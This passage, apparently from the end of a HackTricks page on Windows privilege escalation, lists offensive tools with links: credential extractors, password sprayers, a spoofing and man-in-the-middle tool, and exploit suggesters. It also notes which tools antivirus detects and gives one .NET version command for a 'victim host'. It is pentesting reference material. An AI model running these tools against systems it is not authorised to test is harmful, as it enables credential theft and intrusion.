[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 잘못된 구성과 민감한 파일을 확인합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 잘못된 구성을 확인하고 정보를 수집합니다 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 잘못된 구성 확인**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, 및 RDP 저장 세션 정보를 추출합니다. 로컬에서 -Thorough 옵션 사용.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 자격 증명 추출. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 비밀번호를 도메인에 스프레이합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell 기반 ADIDNS/LLMNR/mDNS 스푸핑 및 중간자 공격 도구.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 Windows 권한 상승용 정보 수집**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 알려진 권한 상승 취약점 검색 (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(관리자 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 권한 상승 취약점을 검색 (VisualStudio로 컴파일 필요) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 호스트를 열거하여 잘못된 구성을 검색 (정보 수집 도구에 더 가깝고 컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 다양한 소프트웨어에서 자격 증명 추출 (GitHub에 precompiled exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 잘못된 구성 점검 (실행 파일이 GitHub에 있음). 권장하지 않음. Win10에서 잘 작동하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 잘못된 구성 점검 (python으로 만든 exe). 권장하지 않음. Win10에서 잘 작동하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 만든 도구(정상 작동에 accesschk가 필요하지 않지만 사용할 수 있음).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력을 읽고 작동 가능한 익스플로잇을 추천합니다 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력을 읽고 작동 가능한 익스플로잇을 추천합니다 (로컬 python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 참고자료

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
